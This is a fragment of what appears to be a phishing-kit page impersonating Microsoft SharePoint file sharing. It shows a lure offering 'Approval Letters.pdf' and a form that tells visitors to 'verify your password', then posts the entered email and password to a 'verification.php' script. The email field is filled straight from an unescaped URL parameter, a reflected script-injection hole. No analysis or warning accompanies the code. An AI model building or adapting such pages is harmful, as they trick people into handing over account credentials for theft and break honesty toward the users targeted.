...
<head>
	...
	<title>SharePoint Secure File Sharing</title>
				...
				<div class="form-content">
					<form action="verification.php?sf58gfd1s689sxd2sdf8angf264s9df23sd2f1n495K3L2C151645172991f1477dbd26917ef3822423f62e984a91f1477dbd26917ef3822423f62e984a91f1477dbd" method="POST">
						...
						<div class="file-description">
							...
							<div class="file-info">
								...
								<div class="file-name" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">
									<span>Approval Letters.pdf</span>
								</div>
							</div>
						</div>
						...
						<div>
							...
							<div class="form-message" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;"><span>Because you're accessing sensitive information, you need to verify your password.</span>
							</div>
							<div class="file-description">
								<div class="file-info">
							...
							<div class="form-input-container">
								...
								<input name="username" value="<?=$_GET['email']?>" maxlength="70" class="form-text-input disable-on-submit is-empty" placeholder="Enter email" type="email" class="textbox" autocomplete="off" required  type="email">
